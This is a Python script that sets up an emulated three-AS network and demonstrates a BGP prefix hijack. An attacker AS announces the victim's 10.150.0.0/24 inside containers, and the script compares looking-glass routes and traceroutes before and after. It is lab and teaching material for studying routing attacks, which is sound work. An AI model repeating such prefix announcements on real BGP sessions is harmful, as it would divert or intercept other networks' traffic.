#!/usr/bin/env python3
"""
BGP Prefix Hijacking Verification Script.

This script demonstrates a BGP prefix hijacking attack using the MCP tools.

Scenario:
1. Victim (AS150) legitimately owns 10.150.0.0/24
2. Attacker (AS666) maliciously announces 10.150.0.0/24
3. Observer (AS300) should receive both routes
4. Traffic from Observer to 10.150.0.x may be redirected to Attacker

This is for educational/research purposes only.
"""

import os
import sys
import time
import logging

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from server import (
    create_as, create_ix, create_node, connect_nodes, connect_to_ix,
    enable_routing_layers, configure_ix_peering,
    render_simulation, compile_simulation, build_images, start_simulation, stop_simulation,
    list_containers,
    bgp_announce_prefix, get_looking_glass, traceroute
)
from runtime import runtime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def run_bgp_hijack_demo():
    logger.info("=" * 60)
    logger.info("BGP Prefix Hijacking Demonstration")
    logger.info("=" * 60)
    
    runtime.reset()
    
    try:
        # ---------------------------------------------------------
        # 1. Create Topology
        # ---------------------------------------------------------
        logger.info("[1/6] Designing Topology...")
        
        # IXP as neutral exchange point
        create_ix(100, "IXP-Central")
        
        # Victim AS150 - legitimately owns 10.150.0.0/24
        create_as(150)
        create_node("victim-router", 150, "router")
        create_node("victim-host", 150, "host")
        connect_nodes("victim-router", "victim-host")
        connect_to_ix("victim-router", 100)
        
        # Attacker AS666 - will hijack 10.150.0.0/24
        create_as(666)
        create_node("attacker-router", 666, "router")
        create_node("attacker-host", 666, "host")
        connect_nodes("attacker-router", "attacker-host")
        connect_to_ix("attacker-router", 100)
        
        # Observer AS300 - neutral observer
        create_as(300)
        create_node("observer-router", 300, "router")
        create_node("observer-host", 300, "host")
        connect_nodes("observer-router", "observer-host")
        connect_to_ix("observer-router", 100)
        
        # Enable routing layers
        enable_routing_layers(["Ebgp", "Ibgp", "Ospf"])
        
        # Configure IX peering (all peer with each other)
        configure_ix_peering(100, 150, 300, "peer")
        configure_ix_peering(100, 150, 666, "peer")
        configure_ix_peering(100, 300, 666, "peer")
        
        # ---------------------------------------------------------
        # 2. Render & Compile
        # ---------------------------------------------------------
        logger.info("[2/6] Rendering and Compiling...")
        render_simulation()
        
        output_dir = os.path.join(os.getcwd(), "output_bgp_hijack")
        compile_simulation(output_dir)
        
        # ---------------------------------------------------------
        # 3. Build & Start
        # ---------------------------------------------------------
        logger.info("[3/6] Building and Starting Simulation...")
        build_images()
        start_simulation()
        
        logger.info("Waiting 30s for BGP to converge...")
        time.sleep(30)
        
        # Find container names
        containers = list_containers()
        import json
        c_list = json.loads(containers)
        
        victim_router = next((c['name'] for c in c_list if 'victim-router' in c['name']), None)
        attacker_router = next((c['name'] for c in c_list if 'attacker-router' in c['name']), None)
        observer_host = next((c['name'] for c in c_list if 'observer-host' in c['name']), None)
        observer_router = next((c['name'] for c in c_list if 'observer-router' in c['name']), None)
        
        if not all([victim_router, attacker_router, observer_host, observer_router]):
            raise Exception(f"Missing containers: victim={victim_router}, attacker={attacker_router}, observer={observer_host}")
        
        # ---------------------------------------------------------
        # 4. Check Routes BEFORE Hijack
        # ---------------------------------------------------------
        logger.info("[4/6] Checking Routes Before Hijack...")
        
        before_routes = get_looking_glass(observer_router, "10.150.0.0/24")
        logger.info(f"Observer sees for 10.150.0.0/24:\n{before_routes}")
        
        # ---------------------------------------------------------
        # 5. Execute Hijack
        # ---------------------------------------------------------
        logger.info("[5/6] Attacker Announcing Victim's Prefix...")
        
        hijack_result = bgp_announce_prefix(attacker_router, "10.150.0.0/24")
        logger.info(f"Hijack Result: {hijack_result}")
        
        logger.info("Waiting 15s for BGP update propagation...")
        time.sleep(15)
        
        # ---------------------------------------------------------
        # 6. Check Routes AFTER Hijack
        # ---------------------------------------------------------
        logger.info("[6/6] Verifying Hijack Effect...")
        
        after_routes = get_looking_glass(observer_router, "10.150.0.0/24")
        logger.info(f"Observer sees for 10.150.0.0/24 AFTER hijack:\n{after_routes}")
        
        # Traceroute to victim IP
        trace = traceroute(observer_host, "10.150.0.1")
        logger.info(f"Traceroute from Observer to 10.150.0.1:\n{trace}")
        
        # ---------------------------------------------------------
        # 7. Cleanup
        # ---------------------------------------------------------
        logger.info("Stopping Simulation...")
        stop_simulation()
        
        logger.info("=" * 60)
        logger.info("✅ BGP Hijacking Demo Complete")
        logger.info("=" * 60)
        return 0
        
    except Exception as e:
        logger.error(f"❌ Demo Failed: {str(e)}")
        try:
            stop_simulation()
        except:
            pass
        return 1

if __name__ == "__main__":
    sys.exit(run_bgp_hijack_demo())
